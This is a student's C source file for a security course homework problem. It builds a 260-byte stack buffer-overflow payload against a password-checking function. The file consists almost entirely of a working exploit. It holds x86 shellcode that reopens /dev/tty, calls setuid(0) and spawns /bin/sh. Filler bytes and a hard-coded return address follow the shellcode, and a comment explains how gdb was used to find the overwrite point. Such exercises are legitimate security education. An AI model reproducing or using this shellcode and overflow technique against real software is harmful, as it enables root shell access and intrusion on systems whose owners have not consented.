/*  
*   Stephen Tambussi
*   COEN225
*   HW2: problem 1
*   10/18/22
*/
#include <stdio.h>

//50 bytes
char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80" //8 bytes
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80" //17 bytes
"\x6a\x17\x58\x31\xdb\xcd\x80" // <-----these 7 bytes will call setuid(0)
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"; //18 bytes

//206 bytes
char filler[] =
"00000000000000000000000000000000000000000000000000" //50 bytes
"00000000000000000000000000000000000000000000000000"
"00000000000000000000000000000000000000000000000000"
"00000000000000000000000000000000000000000000000000"
"000000"; //6 bytes

int main()
{
    unsigned int nonprintable=0xbffff560; //return address --> 4 bytes
    printf("%s%s%s\n", sc, filler, (char *)&nonprintable);
    return 0;
}

/*  Solution Explanation:
*   To solve this problem, I first needed to determine the return address of the IsPasswordOK
*   function and where it was located in memory. Disassembling the main function in gdb showed
*   me what the return address was and then displaying the memory values showed me where it was.
*   The return address was placed immediately after the "Password" string buffer in memory so all
*   I needed to do was overflow the buffer by passing it a string of 260 bytes to overwrite the 
*   return address. The contents of this string include the executable shellcode, filler values,
*   and new return address. The shellcode is 50 bytes long and placed at the beginning of the string.
*   The next 206 bytes are simply '0'. The last 4 bytes of this string is the new return address 
*   that points to the executable shellcode. Since the shellcode is placed at the beginning of
*   the "Password" variable, the new return address only needs to point to that variable's location
*   in memory at runtime. 
*/